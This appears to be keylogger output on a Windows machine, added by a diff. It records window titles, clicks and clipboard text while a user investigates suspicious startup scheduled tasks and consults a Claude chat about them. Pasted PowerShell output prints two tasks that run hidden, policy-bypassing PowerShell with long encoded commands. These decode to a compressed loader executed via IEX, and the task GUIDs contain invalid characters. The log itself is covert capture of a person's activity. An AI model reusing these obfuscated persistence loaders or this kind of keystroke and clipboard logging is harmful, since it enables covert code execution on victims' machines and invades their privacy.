@@ -1,0 +1,2731 @@
+﻿  [LMB]
+  [Clipboard]
+  Get-ScheduledTask -TaskName "AdobeDailyUpdateCheck_*" | ForEach-Object { $_.TaskName; $_.Actions | Format-List Execute, Arguments }
+
+--- WINDOW  2026.07.27 11:05:36  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:05:36  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:05:43  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Clipboard]
+  Get-ScheduledTask -TaskPath "\Agent Activation Runtime\" | ForEach-Object { $_.TaskName; $_.Actions | Format-List Execute, Arguments }
+
+--- WINDOW  2026.07.27 11:05:46  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:05:46  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:06:40  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:06:41  [Lightshot.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:06:50  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:06:51  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:06:51  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]<
+
+--- WINDOW  2026.07.27 11:07:03  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:03  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:05  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:22  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:07:23  [Lightshot.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:07:33  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:34  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:34  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]<
+  [LMB]
+
+--- WINDOW  2026.07.27 11:07:48  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:07:48  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:08:00  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:08:01  [Lightshot.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:08:07  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:08:07  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:08:11  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:08:13  [Lightshot.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:08:18  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:08:20  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:08:20  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl][Ctrl][Ctrl][Ctrl]<
+  [LMB]
+
+--- WINDOW  2026.07.27 11:09:28  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:09:29  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+  [Clipboard]
+  PS C:\Windows\system32> Get-ScheduledTask -TaskPath "\Agent Activation Runtime\" | ForEach-Object { $_.TaskName; $_.Actions | Format-List Execute, Arguments }
+  S-1-5-21-2638959922-1800911258-2240121548-1001
+  
+  
+  Execute   : C:\Windows\System32\AgentActivationRuntimeStarter.exe
+  Arguments :
+  
+  
+  
+  S-1-5-21-2638959922-1800911258-2240121548-1001-{A5310325-8293-123D-GKCA-29BDA54357E1}
+  
+  
+  Execute   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Arguments : -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABiAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHI
+              AaQBuAGcAKAAnAHIAVgBoAHIAYwArAEwASQBGAGYAMwB1AEsAdgArAEgATABvAG8AcQBTAFQARgBpAEEAWQA4ADkARQB5AGEAVABCAEwAOQAyAFMASQB6AHQARwB0AGcANABGAFoAWgBzA
+              GgATgBRAFkAcgBaAHUAVwB0AHIAdABsAFQAQwBiACsANwA3AG4AOQBrAEYAQwBMAGgANwAwADEAdwB3AGQAYgBhAHQAMQBYAG4ANwA3ADMAMwBDAHYAVgBMAHgAbABMAFcAQwA4AFUAYwB
+              VAEwAdgBHAEoANQBoAGgAbQBtAEkAMABTAGYAawBEAEUAVwBTAE8AbwBjAEgAOQBlAHYAawA0AFMAbwBtACsAQwA0AFEAYwAxAGoAKwBXAHgASgBUAFgAMQAzAFgATQBYADMAcQA5AHUAN
+              wB1AEwAbgBxAGoASABuAEoANgBVAFQATABGAFAAegAvAGkARgBVAGsAZQBmAGcAbQBEAFYARwBRAE0ATgArAEUAYQBMAEIAdwBlAHgARABQAGsAKwBqAFEAUgB5AEIAMQBoAEwAcgBTADY
+              AZgB4ADAATAB6AEEASwBpAGIAWgBXAGMAZQBCADcANgBlAG4AaQBBADQASABlAEQAbAAzADUAZgA0AEEAWAB5AE4ANABTAFEAZQBqAEIAYQBwAFIAagBKAEoAZQBSAGYASgBRAHoAQwAvA
+              GgAKwA2AHoAWQBSAC8AawB4AEYAeQBlAFAAQQBpAFAAZABjAFgAZQBEAEgARgA3AEEATABQAEkAUABhAC8AdQB0AHEAdQBNADcANABnAHAATAA5AEkARQB5AGIAYwBXAHMAWQB4AE8AKwA
+              0ADAASQAwAEoAcQAzAHMAUQB4AEEAbQBrADIASgBYAEcASQB1AEEAZwBFAC8ATQBQAFAARQBDAGwARgBmAEEANABLADYARQBjAHMAZQBuAHgARgB3ADcALwBqADEAUgBBAGUAWQB6AGUAb
+              QBBAGoAMwBCAG4AZgBmAFIAKwBTAGIAegAwAGcANABZAEIAMAB2AFQASgBHAEMAUgBOAGoANQBkAEMAVAB5AGUASQBNAEIAVgBDAHUAUAB2ADQAVwBNAFEAcABQACsASQBtAGMAZwBDAEE
+              AcQA1AFUAOQBOAGwANQBFAHUARwBHAGUAcABqAEIAVQA0AG4AcQA5ADMAQQAwAFMAbgA2AGkAYwBRAGkAbQAzAFUAegBlAEwAcQBWAFgAYwBOAGwAQQArAG4AWQBZAEIAbABRADcATgBwA
+              HMAawBhAFkANQBwAEEAdwAxAGgAdgAzAGoAUgBIAEkARwA1ADUAbABDAHcAbQBEADYAYwBaAFQARwBKAE0ARQBQAHAAawB2AC8AMwBMAEoAdgBOAGQATAB4AGgATwBOAGMAMwAyAHUAWQB
+              WAEMAUgA3ADQAdAA4AFoAdQBmAFAAZQBwAHUAQgBOAE0ASABnAG4AawBGAG4ANQBnAFMAVQBhAGoAKwA1AGgARwB5AGQASgA5ADEAVQBNAEQAbgBjADgARABOAHMAUQBDAHMAcwA1AGMAT
+              gBRADAAWQBiADgAcwBDADcAVQBoAHUAMwA3AFgARABtAGQALwBUAGEAQgA4ADgASgBOAFgAMwBHAGgANAA2AEMASgA3AFAASQBYAEQAeAByAFoAaABrAGQAbAB4AHoAaABvAFAAbwBqAGk
+              AVQBoADUAcgB3AGYAYgBRADAAeAB5AFkAVABXAEkAbQBtADAATABFAFMALwBWAHgAegBuAEoARQA1ADEAbQBlAEQAZgBNAHMAbABZAE4ANQBtAHMAOAA5AGQAUAA1AGgAWAA3ADAAeQBRA
+              GgAcQBNADgATAA4ADMARAAwAGkAMABEADAAbgBvAEsAWQBCAEYATgBpAE0AbgBtAG0ARgBwAFUAcgBEAC8AbQAvAEEAaQBPAGkAMgBuADkAbwBUAGYASwBOAFkASwB1AGMAdgBlAHEAQQA
+              xAFgARQBIAEUAcQBBAFgAUgBiADUAaQBLAG4AKwBRAGsAMQBGAE0AWQAwAG0ANABxAEUAUgBQAC8AawAyAHcAdwBNAGgAUgBTAHUAZQBhAFAAeAAyADkAeQBOAE0AQQBxAE0AMwBwADMAZ
+              gBVAGQAeQBZAFMAYwBBAC8AdwBaADgAQgBzAEsAQQB4AEgATwBjADMAZAByAGoAaQAwAGMAagAwAEcAbABXAFQAWQA0AGsAZAB5AEsAeABKAHcAbABTAC8AUgBpAEcASABJAGQAWABZADk
+              AegBpAEkAYQBzAFYAQwBEAFEAQwB6AGkAbQBFAHAAcwBFAHEAcABSAGgASwBUAHIATABxAE8AbwBUADYASgA0AEIAZAAvAHQAQQB4ADkAYwB4AHgAWABrAEEAYQBjAEMAQwBoAFQAdgBtA
+              EsAdgAwAG0AcQBDADYAVAAwADkATwBQAHgAbgBtAEMAMwBEAFkAbABXADAAKwA2ADMAVgA2AGEAWQBoAHIAMQBDAEYARQBwAFgAbQBiADIAaAB0AFoARQBSADQAQQBwAEEAMQBRAGIAaAB
+              iAGIASwA5AGsAcwBLAFIAUwBRAGQAZABMAHMALwBqAGEANAArAGUARwBZAFgAUgBXAGkAUQBHAC8ANgA2AFgAcwA4AFQASwBxAFMAeAAvAEUAagBtAFMAeABvAEIATQBCAHEAaABiAG4AZ
+              AByAGIAYQAvAGgAMQBPAEkAKwAvAGcAMgBOAGQAVwBxAEQAMAAzADkAaABsAGsAZwBRAEcAUQBaAEEASwBYAEoAYwBtAHEAQQBBAFgARAA5AGgAdABGAFEARwBQAEEAZQBwAGkASgBRAC8
+              ARQBRAHUAQwBoADEATgB3AEsAWAB2AFoANwBmAFIAWABIAEkAbwA5AHgAWAB2AFMANwBoAGgARgBDAGkAMwBNAEQAcgBUAEUAQwBDAHEAdQBSAG0ARgA5AGYAZABXAEUAYwB3ADcAQwBXA
+              EsAeQA4AHMAbgA5AHAASgB4AGMAWQBKAGQAcQBqADYAegBWAEgATABGADYAVQBkADUAdQBmAFgATABmAGIANQA3AEsARAAzAHIATAA3AE8AUgB6AHoAVQBHAGEAZgBxAHcAMgBvADkAQwB
+              tAE0ATwBpADQAUQBpADcAeQBPAHIARAAyAG4AVQBPAHQAOQBpAGYASgBZAEYAcwB0AHgAWgA5AEoANgBiAFUAOABWAE4AagBIAGIARwA4AE0AMABNAGoASABXAHYASgBKAHQAbABaADcAY
+              QArAHkATgBOAGwAdABSAHoAUwBpAGQAbQBuAFAAcwBQAEEAcgBXAEsATwBVAEwAKwBWAEcARgBhAEIAbAB5AFoASwBzAFkAcgBqAEIATgBSAEUAYgBsAGYARwBvAG0AUQBuAEkASwA4AHA
+              AaABGAFQAbQBrAGYASQBhAGUASgBuAEsATQA2AGkAQQBPAFgAbQBwAFkAOABDAEEANQBNAGMAdABYAEgAaABiADIASgBnAHEAMQBYAHoAOQBZAHAAawBmAE8ANQBEADQANQBOAHQARABGA
+              EoAZwBSAHoASABwAHAAKwBYAGMAMQBDAHYATgBhADAAdwBmADUARABpADAAcwBXAEcANwBSAG0AcwBvAHQAMQBFAHIAWQBuADMAWgBVAHQATQBGADgAWQBIAGkARwB3AHEANwBHAHIAMQB
+              2AC8AdABkADUAeQBPAEoAVQBkAEIALwB6AEoAKwBiADgAcQBzAHYAeQBIAE0AMwB4ADIAZgBFADYAUQBCAHAARgBMAEQAbABsAEEAKwAvAGkAQQBBAEIAMwA2ADAAVABLAEEATwAyADYAb
+              QBpAHQAOABuAHAASgBZAFMATQBMADQAQwB6AEMARwA5AHcAbwBPAFUAbgBrAC8AQwBqAG8AdgBQADAATgBXADcAagA0AFIAUQB5ADIAUQBwADIAdABnAFkAaQBCAHIARQBTAHgAUwBiACs
+              AdQBXAHQAbQA3AFUAZABYAHoAZgBSAC8AZgA5AG0ANAB2AGIAZQA0AFMAKwB0AGwANwBnAFQALwBzAEYAaQBIADUAVwBzAHQAYwBvADMARwAyADEANwBEAHEAZwBwADEAVABBAG0AbwBQA
+              CsAZwBOADYAZgBlAGwANAB4AEEARwBlAGcAbAA5AGYATQBqAHkAUwBaAEIAdQBSAG4ATgBhAHkAYgBuAGoAQwBFAFcAZgBhAFgAMQBvAGYAMgBTAFEAdgBZAFIAOAA3ADcASQBZAEEAcwB
+              jAEEAUwBFAEoAWQB0ADEARgBoAEMATwBjAHoAUABiAGUAVQB5AFYATAB5AEQAUQBIAEUAZwBaAG8AQQBxAFcAdwBRAFMAMwBkAHAAeQBYADgAdABxAHcAVgAzAG8AbABLAEMAOQBEAEsAZ
+              QBGAG4ATwBNAGkAVwBMAHEAVQA2AGgANQBxAEQAVQB4AGwAeABjAEMAeQByADkAUQBJAEUAMQBhAGcAUAA3AFIAYwA1AEsALwBqADkATQBCAGoAOABFAEUAWABvADgAKwBmAHUAWQB0AEg
+              AbABIAE8ATABmAEIATAAwAEsAMQBpAGMASgAwAFkAZQBXAFYAMwAxAFMAUQA4AFAATAA0AGIAQgAvAGUANABPAEcAbwA5ADYAWABrAFUAegBYADMASAAvAHQANwBWAFkAYwA5AGMAWgBUA
+              EoAdwBFADMAOQBHAFoAeQB2AEYANQBOAGUAaQBVAHkAUwBHAEEAMgBrAGEAOABtAFgAMQAvAE0AaQBzAHgANgBHAEcAcABzAG8AdAB3ADUANwBwAFMAVQBWAEMAVQBZADAAdwB0AHAAOQB
+              qAHEAWQBZAHMASwBWAGMAWgAwADEAcgBlAGQAVwBXADAAcQBNAHIAdwBkAG4AZQBVADMAQgBXAGsAZQB0AGYAYgBIAFcAMwBxAG0AMQBnAGIAVgAyAG8AdABiACsAMgBTADQAdABuAGUAc
+              QBsAGoAbAB6AFMAUgA4AFkAeQBTAGkARQBYAFYATQArAEIAUABEAGcAOABXAE0ANwBsACsANQBtAGIAUAB5AGgAcQBFAHcAWgA5AEoAdgB3AGgAdwBUAGkARgB3AFMAZwBtAEoATwBZADQ
+              AVABHAGoARQBVAGIAdABvAEoAVgBTAGgAbAA1ADkAOAAzAHQAUAA0AGwAVwBrAGsAOABIAGoAZAAwAEwAYQBtAFEAOQA0ADMAbAB2AGwASgBiAEIAMABQAGMAbgArAEsAVgA0ADIAbwBEA
+              DAAZABaAE8AawBTAEwAVQBuAGEAeQBYAG8AWAB1AGwATwB0AHQAWABMAGMAdQBZAFkAdABwAC8ASAB4AGMASwBZAEkAbwBHAEMARABmAGQAcwBtAHcAbABXAEYARwBvADkASwBIADYAdQB
+              IAHYAVABLAFkAQwBoAFYAeQB4AGcATQBHAGsAcABZAFYARABOAFYAKwBOADAAbABwAEEAbQBUAEsATwA5AHcAegBWADcAVwBNAFkAbwB4AE8ARwAzAGkASgBxAGsAMwB2AFIAMgBlADIAb
+              ABZAHUAKwBtAEoAcwBZAGEASgA5ADUAYwB0AHgAUwBGAGgASgBxAG0AdgBFADMAZABBAGcATABkAFgAUQBLAFkAQQBrAHUAMwBaAFUAaABVAEwAOQB6AG0AMwBzAEwASABoAEYASABZADI
+              AQwA2ACsAcABRAFAANwBTAG4ATwBQADMAbwB1ADkAdABEAEcAUwBsAEcAUwBLAHIASQBBADIAQwB0AHQANwBlAG8AUwBJAFcAaAArAFIAdgBQAEMAaABRAGoAcwBuADcAOQBUAE4AMABaA
+              EcAMQBuAC8ASQBSAGIAbgB6ADYAQQBIAEYAUAA0AGUARQBmAGQAOQA2AGYAdgBwAGYAOABEAFMAVQBzAFkAcAByAGgAdABiAHYAQwBTAG8AbQBVAG0AagBMAFQAZwA1AGgAeQArAFEAbAB
+              DAFcAdABuAEEARQBMAEEARABRAFEAbABhAFMAVwAwAE0AbwBwAE0ATgBPAFMANQA2AEMAdAAyAEMAVAA3AGUASQBxAFEAQwBNAHEARABwAFAAMQAxAFgAcwA0AHUAYwBHAFkAQgA1AE8AU
+              gBFAEEAcwBJAHYASwBKAFEATwA5AGEATABhACsANgByAHcAMwAvAGEANgArAEcAbABtAHkAWgAzADgATQBYAHkAdQBZAHUAegBsAGgAbgBpAFQAWABQAFMARwB4AHEAdABsAFEAZQByAHA
+              AVQBGAHAAYwBvAFYAeQBTAE8AbQBLAGwAaQBMAFYAUABnAHkARgBtAHIAQQBrAGcAZABiAE8AUgBHAGcAKwB3AHMAMQAvAGgAdABWAFoAMwB4ADUATQA3AHIAOABNAG4ARQArAG8AaQBtA
+              DAAOABNAGMAcQBNAHEAMwBuAFQAcwB1AFMAUgAzAHMAawBMADIAMwBMAEYANQBqAHMAcwAzAHQAaQBTAC8ALwBKADMAeQBkADgAYQBnAHYALwBlADUALwBzAGUAMQB2AFcALwAvAE0AKwA
+              0AFEAKwAyADgATgBNAGUAMgBWAFoARgA5AHUAeAB4AG4AKwBGADMAdAB2AEQAbgBCAE4ANABmADkAbwBnAGYAVgAwADYARgBSAG4AdQBrADIAMgAxAGIAKwBsAHkAdwBmAFYAQwAzAC8Ab
+              QBpAEwAagA0AEwAcABQAHUATgBuAGwAVgBCADQAdQBGAE0ANgB3AHIATQBnAEkAMgBJAGIAZAA2AHAAaQBsAGIAUQBrAFgAMgBxAGUATwAxAGUANwBDAFoAYQBIAEEAUwAwADEATgAvAHY
+              AVABKAHAAaABvAG8ATwBNAHQAOQBLADUAVgBKAFkAUABaAEEANgAzADUARAB0AGsANQBPAGQAMgBoAHMALwBrAEcAYQAzACsAdAAxAFUAWgAzAGUAbgB6AHIAZAA0AEIAZAAzAFEAUwBYA
+              DkANwByACsAdQBwAHEALwBaADYAdgA5AEYAagBjAFMAbQBvAGIAWgBwAHYAdwAvAFYAWAArAEsATAB3AFEATgAxAE4AbwBSAHAANgBaAEsAOABKAFcALwBVADUAYgBZAGcAcABlAC8ASQB
+              GAFIAUABWAFAANgBxAC8AVwBnAEgALwA2AHkAbgBmADIAVgA2AGQAKwBNAG8AVQBlAEgAUgBKAHkATgBkAGEAUwBzAHkAVQBXAEQAKwBrAFAAUwAwAGsAUwBqAGYAagBYAG4AWABQAGYAV
+              ABsAC8AdwA9AD0AJwApADsADQAKACQATQA9AFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQA6ADoAbgBlAHcAKAAkAGIAKQA7AA0ACgAkAEQAPQBOAGUAdwAtAE8AYgBqAGU
+              AYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoACQATQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvA
+              G0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsADQAKACQAUgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQB
+              SAGUAYQBkAGUAcgAoACQARAAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkAOwANAAoASQBFAFgAIAAkAFIALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAO
+              wAkAFIALgBDAGwAbwBzAGUAKAApADsAJABEAC4AQwBsAG8AcwBlACgAKQA7ACQATQAuAEMAbABvAHMAZQAoACkA
+  
+  
+  
+  S-1-5-21-2638959922-1800911258-2240121548-1001-{C9410325-8293-D162-AGCE-160AC52357D8}
+  
+  
+  Execute   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Arguments : -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABiAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHI
+              AaQBuAGcAKAAnAHQAVgBaAHQAYgA5AHAASQBFAFAANABlAEsAZgA5AGgAaABaAEEATQAxAHkAegBRAHAASwAzAGEAbgBLAEkANwBFAHkAQwBRAGwAcABlAEEASQBXADAANAB4AEMAMwAyA
+              EIATAB2AFkAYQA5ADkANgBUAFUATABUAC8AUABlAGIAWABSAHYAaQB0AEoAZABlAHAATwB2AHgAQQBjAGsANwB1ADgALwBNAFAAUABQAE0ANwBCAGEAYgBRAG8AVABDAHQASwBVAFgAOAB
+              vAEcAQQBhAHgARABBAGIAUwBBAG4AeABCAGoASgBNAEQATAAyADkANABvAE8AKwBHAHoAVAA5AFQAaQB1AHYAYwBaAFAAagAwAHMAUQBhACsAYQBuAEsAMgA5AHEAKwAzAHUANAB1AEgAU
+              wB0AGMASQBXAGYAMAA5AEUAbQBsAGgAQgBVAEwATABpAFYAbABTAGEAMwBRADgAZgBqAHkAOQBuAHgAOABkAGgAcQB2AGEAMgBjAGcAUgB4AEoAZwBRAHUAbAA2AFcAbgBJADEAeQBBAGs
+              AVwBsAG8AaQBEAE8AbwBzAGgAagBlAHYATQBwAHQAeABkAGUAagBYAFcASAB2AGkAZgBUAHkAcQB1ADAANwByADcAVwAxADMAMwBPAHQAWQBZAC8ALwBpAFkAdABLADgAdQBhAGoAMQB4A
+              FAARAB5AHYASABuAGwAMQAvADMARgB5AHkAagArAGUATwBSAGYATABIAGkAMABjAGMANABtAHEAOABWAFIANQA4AGoANgBzAG4AbwA5AG4ATgBRAFAAaAA3AFgAegBSAHYAZQB3ADEAYgA
+              2ADYAbgBQAFMANwBLADkALwB2AHYAYQB5AHYAcgA4AGEAdABVAFgAYwA4AHEAWQAvAFAALwBBAFoAOABiAEYAMABOAFYANgB2AE4AeABPADgAYwBEAHYARwA3AGQALwBiAHAAMQBhAGYAe
+              ABPAFQAZgBLAFoAWgAxAE4ALwA0AGIALwBwAEcAdwBXAGwAKwA4ADIAVABxAE4AegAyAEcAMQA4AHUAdQBsAGYAbgBKAHgAcwBQAFEAdwBoAEMAbgArAG0AQwAvAE0AQgB1AGkANABZAHQ
+              AOQAyAGYAQgB0ADYASwBGAHMAcwBNAEgATwBGAEIAaQBBAC8AaABFAHMASABQAFEANAAvAFQAQQBaAE0AdQBLAFEASgBmAEgANQB1AEQAUQBjAE8AMABUAEcASwBZAFQAcgBpAEEAUAAxA
+              GEAdwA4AGMAUABsAFAASQBuADgAawBEAGwAegBVAEIAcQByADQAQQBMAHEANgBUAHIAaABXAG0AegBrAFUAbgBnAFMANgBGAGoAdgAwAEMASQBrAGQALwB0ADcAQgBIADgAUgBFAHkAdwB
+              vAFQAVwBNAGQAdwBZAHcAVQB1AHgARABIAGIAQQBuAGwAMQBGAHIAMABQAGEANwAwAFcAVABLAG0AZAA3AFgANwBHAGIAbAA3AGUAVwA4AFEAZQBrADEASwBtAEIAQgB0AE0AQQBtAEUAd
+              ABrAEkAUgBNAEUAbQBNAEQAZgA1AG8AdAAwAHMAZABoADcAVABiAHgAMABGAHcASABNAGQARwArAGUAQgBiAFEAQwBrADIANQBHADcASABWAGEAZABmAGEAWABrACsASQBCAGQAbQBGAEE
+              ARgAzAFQATgA5AFgAOQBKAFcAeQB4AEEAOAB5AC8AeQA5AEkANABVAC8AeABKAHkAOABjAC8ASgBEAGsATQByAGsAbgBOAHAATgBZAGoARAB0AHkAdgA3ADkAMwByAHgAagAwAE0ATgBTA
+              EgAbgBxAEoATABTAFcAcABsAE4ASQA4AGsARQA1AEsATwBmAEkAQwBJADAAQgBIAFkASQBYAGYAaQAvAE0AWgBmAHMATgBYAEsAUgBDAFAAYwB1AEIAZwBnADIAcQBSAEkAbwBLAHgASQB
+              LADIASgBnAEsAbQBoAGQAagBXAGQAVwB4AG0AYQBSAFQAQQBSAGsAUgBVAG4ARABvAGoAeQBVAHAARwBSAEIATABOAFAAagA5AEEATgBXAFMARABBAC8AeABjAG8ANQBLAFoAZQAzAHQAW
+              ABvAGkANwBQAHkAUQAwAEoARwBuAHUAOQBFAHMAUABaADYAQQBwAGsASgA1ADEARQBYAHIASQBIADAALwA4AEYAWAA1AEEASAB5AHAAbwBvAEcALwBOAEYAWAAvADIAVABFAFMASgBpAEE
+              ASQBKAFQAUQA4AGcAWABRAFYAbwBtAFQAaABlADMAWgBWAGsAMwBYAGEANwB3ADcARwBWAG4AUABZAE0ANwB0AE4ATwBvADUAQgBGAEgAYQA3AGUAeQB6AFEAdQB2AHUAUgB6AHUAYgB0A
+              E4AZwAwAEMAcQBuAFMARwBFAGoARQBxADgAbABZAGEARwBzAEIAWABKADMATgB1ADAAVgBnADEAOABEACsASABYAGEANQBZAHcAZwB0ADAAWABpAFUAMABxAGwANgBPAFkAUgBrAEEAbAB
+              6AEUAZQAxAGgAZwAwAGoAbgB4AFAANgBxAE4AZgBDAFgAcAB2AE0AdAB1AGwALwBjAFYAbgBzAEsAVwBTADgARgBoADQASwBMAHgAbQBqAEwAVQBGAGoASgBCAGwAUABWAHkAYwBhACsAR
+              QBVAEkAMgBRAFQAQgBhAHIAQQBkAHMARAAwAE0ANABwAEYAQQBhAEsAZABSAFoANgBpAHcANQBVAHkAaQBvACsAcgBWAGYAeQBzAEwARAAzAHAASgBvAHUASwBIAFEAWgBWAGcAUQBNAHI
+              AcgBxAGEAegBzAFoAbwBOAHMASwByAGkAVgBlAEYAVQB0ACsAQQBGAFQAZQA5AGkASQB5AEgATwBEAGEAQwBIAHAAaABvAEMAVQB5ADEAVgBWAHgAdABLAGoAOABxAGMAZABZAFkAKwArA
+              G4AKwBVAFgARwBKAC8AUABuADgAbQBwAG4ARwBVAGMAKwBjAEUATABPAEYAVwBaAHgARAA1AHoASQBhAFMATgBoAHcAUQBJADYAVgBvAGoAdgBuAFAAcAB5AGEAOQBZAHYAUgBMAGoAYgA
+              2AGIAegAxADQAWQBhAEoAcwBPAG0AdwAzAHoAMQBHAG8AMgA1AG0AYwBkAHEAegAyAHUAegB3AGUAbQBOAFQATwBlAGgAZQBwAE8AbwB6AEMASgB4AFMAdwBIACsAZwBTAG0AMQBYAC8AZ
+              gA3AEsAVwBvADMALwBMACsAVgBKAEkAWgAvAGMAcABYAE8AdABVAFgAYgAxADQAcABYAGUAUgB1AEEAaQB0ADgAZABBADgAOAA4AE8ARgBpAEIAVQBFAG8ATAA3ADkAbgBkAFQARQBUADY
+              AWQBiAEMAKwA4AEwAMABXAEUAYwBGADEAWQBFAEoARQBDAFIAOQBGAFIAUwB5AFQAYgBZAE4AawBTAFQAWgBEADUAOABYAEwARQBJAHQAMgAvAHAATQBkAGMAMgBkAFQARwBvAHYAUABzA
+              GMAaABOADkASQBqAGgAdQBvAC8AYQBpADUAUgBZAEkAWQArAE0AaABqAFIAOQAzAHAANgBwAFoAZQBHAHMAUwAxAHQANwBEAEkAbABhAHAANwA0AC8AdgA2AGUASAB1AGYAWgBWAFEARwA
+              zAFgAbwB3AGkAVQBOAGQAVgBoADYALwBEAEYAZABBAGgARAByAGMAdQBZAEwAdwBPAG8AZABnAHUASwBCACsAbABlAHUAegBHADMALwBEAHQAYwA2AEkANgA4AHMAawB1ADIAbAA2AHMAT
+              wBQAHgAbwBPAHkATgBoAHgAdwBiAE4AUQBKAEYAYwBRAG4ATgBQAEsAcQBKAGUAVQBWAGsAMABXAFoAagBiAG8AQwByADQAagBSAG4AawBMAHcAaABWAGkAZABEAFoANQBMAGcATgAwAHE
+              AdABLAHMAWgByAGUAcABmAG0ASgBVAFgAaABRAE8AbgBLAGsAcwBGAFUAZAAwADgAVgBGACsAZwBoAFEAaQA5AHYAQQBkADEATgBYAFIAYQBMAHUASABPADEAcwBhAHUAQwBYAE0AZABOA
+              FQAQQBRAFAAVQBVAGUAUQA0AGYASQBJADMAVABkAHMAMgA2AFUARQBpAC8ANABtAFMAdQBrAHEAbABsAEcAYgAwAGwAVwBUAFMAcwBrAEoANgBqAGkAVgBHAEQAawAvAFQAcwBLADEATgB
+              CAEkALwBWAG8AQwBUAHcASwA3AEYAZABKAG0ASwBRAEoANABtADgAcABtAC8AVgB2AE8AcwBuAGsAdgBaADAAaQBWAFYAYwBRADIAUgBoAEQAZgA5AHkAZAArAGcAUgBiAFUATwBPADUAZ
+              gBUAHcAOQAwADgAUABIAEoASwBWADUAcQAyAFMASwBFAFoAUQBlAGYAeABBADAASgBTAGgAVwBXADEAcwBnAEcAUwBlAEgAKwA5ADIASQBJAHYAZgBnAHoAMgB4AGUAZgBjAEUAZQBQADQ
+              AZwB1AC8AOABiACcAKQA7AA0ACgAkAE0APQBbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AOgA6AG4AZQB3ACgAJABiACkAOwANAAoAJABEAD0ATgBlAHcALQBPAGIAagBlA
+              GMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKAAkAE0ALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwB
